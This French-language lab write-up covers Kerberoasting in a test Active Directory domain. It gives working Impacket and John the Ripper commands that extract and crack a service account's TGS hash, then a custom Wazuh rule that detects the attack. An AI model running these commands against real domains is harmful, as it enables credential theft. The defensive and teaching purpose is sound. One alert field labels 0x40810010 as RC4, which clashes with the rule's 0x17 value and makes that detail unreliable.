# 🔐 Labo Active Directory — Kerberoasting & Détection SIEM

> **Auteur :** CryptoGate  
> **Date :** Octobre 2026  
> **Catégorie :** Active Directory | Pentest | Blue Team  
> **MITRE ATT&CK :** [T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)

---

## 📋 Table des matières

1. [Introduction & Objectifs](#introduction)
2. [Architecture du labo](#architecture)
3. [Mise en place de l'Active Directory](#active-directory)
4. [Attaque — Kerberoasting](#attaque)
5. [Détection — Wazuh SIEM](#detection)
6. [Conclusion](#conclusion)

---

## 1. Introduction & Objectifs <a name="introduction"></a>

Ce projet est un labo de cybersécurité construit de A à Z sur un **Lenovo ThinkBook (Core i7, 16 Go RAM)** avec VMware Workstation. L'objectif est de simuler une attaque réelle sur un environnement Active Directory, puis de détecter cette attaque avec un SIEM.

### Ce que ce projet démontre

| Compétence | Détail |
|---|---|
| **Infrastructure** | Montage d'un labo AD complet sous VMware |
| **Attaque** | Kerberoasting — extraction et crackage de hash TGS |
| **Détection** | Règle SIEM custom sur Wazuh (Event ID 4769) |
| **Outils** | Impacket, John the Ripper, Sysmon, Wazuh 4.14.9 |

---

## 2. Architecture du labo <a name="architecture"></a>

### Schéma réseau

```
┌─────────────────────────────────────────────────────┐
│              Réseau NAT VMware (192.168.10.0/24)     │
│                                                     │
│  ┌──────────────┐    ┌──────────────┐               │
│  │   DC01       │    │   win11      │               │
│  │ Windows      │    │ Windows 11   │               │
│  │ Server 2022  │    │ Pro          │               │
│  │ 192.168.10.1 │    │192.168.10.10 │               │
│  │ (AD DS + DNS)│    │(poste client)│               │
│  └──────────────┘    └──────────────┘               │
│                                                     │
│  ┌──────────────┐    ┌──────────────┐               │
│  │ Kali Linux   │    │ Wazuh 4.14.9 │               │
│  │ 2026.2       │    │ (SIEM)       │               │
│  │192.168.10.20 │    │192.168.10.50 │               │
│  │ (attaquant)  │    │ (détection)  │               │
│  └──────────────┘    └──────────────┘               │
└─────────────────────────────────────────────────────┘
```

### VMs

| Machine | OS | IP | Rôle |
|---|---|---|---|
| DC01 | Windows Server 2022 Standard | 192.168.10.1 | Domain Controller, DNS |
| win11 | Windows 11 Pro | 192.168.10.10 | Poste client, joint au domaine |
| Kali | Kali Linux 2026.2 | 192.168.10.20 | Attaquant |
| Wazuh | Wazuh OVA 4.14.9 | 192.168.10.50 | SIEM |

### Domaine Active Directory

- **Domaine :** `labo.local`
- **NetBIOS :** `LABO`
- **Niveau fonctionnel :** Windows Server 2016

---

## 3. Mise en place de l'Active Directory <a name="active-directory"></a>

### 3.1 Installation du rôle AD DS

Sur DC01, installation du rôle **Active Directory Domain Services** via le Gestionnaire de serveur, puis promotion en contrôleur de domaine avec création d'une nouvelle forêt `labo.local`.

### 3.2 Création des objets AD

**Unité d'organisation :** `Utilisateurs-Labo`

**Utilisateur victime :**
```
Nom : John Doe
Login : jdoe@labo.local
Mot de passe : Password123!
```

**Compte de service (cible de l'attaque) :**
```
Nom : svc http
Login : svc-http@labo.local
Mot de passe : Ninja2024
```

### 3.3 Enregistrement du SPN

Le SPN (Service Principal Name) est ce qui rend un compte vulnerable au Kerberoasting. Sans SPN, pas d'attaque possible.

```powershell
setspn -a HTTP/labo.local svc-http
```

**Vérification :**
```powershell
setspn -l svc-http
# Résultat :
# Noms ServicePrincipalName inscrits pour CN=svc http,OU=Utilisateurs-Labo,DC=labo,DC=local:
#     HTTP/labo.local
```

### 3.4 Sysmon — Télémétrie avancée

Sysmon est installé sur DC01 et win11 pour enrichir les logs Windows. Sans Sysmon, les événements AD sont peu détaillés.

```powershell
.\Sysmon64.exe -accepteula -i
```

---

## 4. Attaque — Kerberoasting <a name="attaque"></a>

### Qu'est-ce que le Kerberoasting ?

Le Kerberoasting exploite le protocole Kerberos. N'importe quel utilisateur authentifié du domaine peut demander un ticket de service (TGS) pour n'importe quel SPN. Ce ticket est chiffré avec le hash du mot de passe du compte de service — il peut donc être cracké offline.

**Aucun privilège élevé requis.** Un simple compte utilisateur suffit.

### 4.1 Étape 1 — Énumération des SPNs

Depuis Kali, avec le compte `jdoe` :

```bash
impacket-GetUserSPNs labo.local/jdoe:Password123! \
    -dc-ip 192.168.10.1 \
    -request -k -no-pass 2>/dev/null
```

**Résultat :**
```
ServicePrincipalName  Name      MemberOf  PasswordLastSet
--------------------  --------  --------  -----------------
HTTP/labo.local       svc-http            2026-10-24 ...

$krb5tgs$23$*svc-http$LABO.LOCAL$labo.local/svc-http*$7240f141...
```

Le hash `$krb5tgs$23$` est un ticket TGS chiffré en **RC4 (etype 23)** — c'est la signature du Kerberoasting.

### 4.2 Étape 2 — Sauvegarde du hash

```bash
impacket-GetUserSPNs labo.local/jdoe:Password123! \
    -dc-ip 192.168.10.1 \
    -request -k -no-pass 2>/dev/null | grep krb5tgs > hash.txt
```

### 4.3 Étape 3 — Crackage offline avec John

```bash
john hash.txt --wordlist=wordlist.txt --format=krb5tgs
```

**Résultat :**
```
Ninja2024        (?)
1g 0:00:00:00 DONE
```

✅ **Mot de passe cracké : `Ninja2024`**

Le mot de passe du compte de service est maintenant en clair. L'attaquant peut s'authentifier en tant que `svc-http` sur n'importe quel service du domaine.

### Pourquoi cette attaque est dangereuse

- Elle se fait **100% offline** — aucune connexion suspecte vers le DC après la demande initiale
- Elle ne nécessite **aucun privilège** — un simple compte de domaine suffit
- Les comptes de service ont souvent des **mots de passe anciens** et peu complexes
- En entreprise, ces comptes ont souvent des **droits élevés**

---

## 5. Détection — Wazuh SIEM <a name="detection"></a>

### 5.1 Architecture de détection

```
DC01 (Sysmon + Agent Wazuh)
        │
        │ logs Event ID 4769
        ▼
Wazuh Manager (192.168.10.50)
        │
        │ rule.id: 100002
        ▼
Dashboard Wazuh — Alerte niveau 12
```

### 5.2 Pourquoi l'Event ID 4769 ?

Windows génère un **Event ID 4769** (Kerberos Service Ticket Request) à chaque demande de TGS. Le Kerberoasting se distingue par :

- **TicketEncryptionType = 0x17** → RC4-HMAC, chiffrement faible et facilement crackable
- Un service légitime utilise normalement **AES256 (0x12)** ou **AES128 (0x11)**

### 5.3 Règle de détection custom

Fichier : `/var/ossec/etc/rules/local_rules.xml`

```xml
<group name="kerberoasting,">
  <rule id="100002" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
    <description>Kerberoasting detecte - Demande de ticket RC4</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>
</group>
```

**Niveau 12** = alerte haute priorité dans Wazuh.

### 5.4 Alerte dans le dashboard

Filtre dans Discover : `rule.id: 100002`

**Informations visibles dans l'alerte :**

| Champ | Valeur | Signification |
|---|---|---|
| `agent.name` | DC01 | Détecté sur le contrôleur de domaine |
| `targetUserName` | jdoe@LABO.LOCAL | Compte qui a initié la demande |
| `ipAddress` | 192.168.10.20 | IP de l'attaquant (Kali) |
| `ticketEncryptionType` | 0x40810010 | RC4 — signature Kerberoasting |
| `rule.level` | 12 | Alerte haute priorité |

### 5.5 Ce que cette règle détecte (et ses limites)

**Détecte :**
- Kerberoasting classique avec Impacket
- Toute demande de TGS en RC4

**Ne détecte pas :**
- Kerberoasting AES (attaquant qui force AES256) → nécessite une règle complémentaire
- Kerberoasting via un compte légitime sur une machine compromise

**Pour aller plus loin :**
- Ajouter une règle de corrélation (plusieurs 4769 en peu de temps = scan de SPNs)
- Activer les alertes par email sur level >= 12

---

## 6. Conclusion <a name="conclusion"></a>

Ce projet démontre une chaîne d'attaque et de détection complète sur Active Directory :

```
Reconnaissance → Exploitation → Crackage → Détection → Alerte
(GetUserSPNs)    (TGS request)  (John)      (Event 4769) (Wazuh)
```

### Compétences démontrées

- **Montage d'infrastructure** : AD, DNS, GPO, jonction de domaine
- **Pentest AD** : Kerberoasting avec Impacket
- **Blue Team** : Règle SIEM custom alignée MITRE ATT&CK
- **Scripting** : PowerShell pour la config réseau et AD
- **Outils** : VMware, Sysmon, Wazuh, Impacket, John

### Prochaines étapes envisagées

- [ ] Pass-the-Hash depuis le compte svc-http cracké
- [ ] BloodHound pour cartographier les chemins d'élévation de privilèges
- [ ] Compromission Domain Admin (DC Sync)
- [ ] Règles de détection pour chaque attaque

---

*Labo construit et documenté par CryptoGate — [github.com/CryptoGate-hub/cyber-writeups](https://github.com/CryptoGate-hub/cyber-writeups)*
